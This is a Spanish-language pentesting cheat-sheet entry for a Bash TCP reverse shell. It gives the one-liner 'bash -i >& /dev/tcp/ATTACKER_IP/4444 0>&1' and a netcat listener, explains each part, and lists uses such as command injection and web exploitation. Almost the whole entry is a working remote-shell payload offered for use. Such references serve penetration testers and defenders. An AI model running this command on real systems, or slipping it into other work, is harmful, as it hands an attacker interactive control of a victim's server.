# Bash Reverse Shell — TCP

## Descripción

Esta reverse shell utiliza la funcionalidad de **/dev/tcp** de Bash para crear una conexión TCP directa hacia la máquina atacante.

Es una de las reverse shells más simples y utilizadas en pentesting.

---

# Comando

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

# Listener

En la máquina atacante:

```bash
nc -lvnp 4444
```

---

# Requisitos

* Bash disponible
* conexión saliente TCP permitida
* soporte para `/dev/tcp`

---

# Explicación

```
bash -i            → inicia bash en modo interactivo
/dev/tcp           → pseudo-dispositivo para conexión TCP
ATTACKER_IP        → dirección IP del atacante
4444               → puerto del listener
0>&1               → redirige entrada estándar
```

---

# Cuándo usarlo

* command injection
* ejecución remota en servidores Linux
* explotación web

---

# Limitaciones

* algunos sistemas deshabilitan `/dev/tcp`
* puede generar shells no completamente interactivas

